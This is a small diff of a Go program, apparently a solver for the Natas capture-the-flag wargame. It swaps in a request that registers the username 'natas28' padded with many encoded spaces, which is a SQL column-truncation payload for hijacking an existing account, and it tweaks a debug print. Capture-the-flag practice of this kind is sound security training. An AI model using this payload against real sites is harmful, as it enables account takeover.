@@ -9,7 +9,7 @@ import (
 )
 
 func main() {
-	result("?x1=1&y1=1&x2=300&y2=300")
+	result("?username=natas28%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&password=0")
 }
 
 func result(xx string) bool {
@@ -34,7 +34,7 @@ func result(xx string) bool {
 	buf := new(bytes.Buffer)
 	buf.ReadFrom(res.Body)
 	bs := buf.String()
-	fmt.Println("\n", res.Header, "\n")
+	fmt.Println("--------\n", res.Header, "--")
 
 	fmt.Println(bs)
 
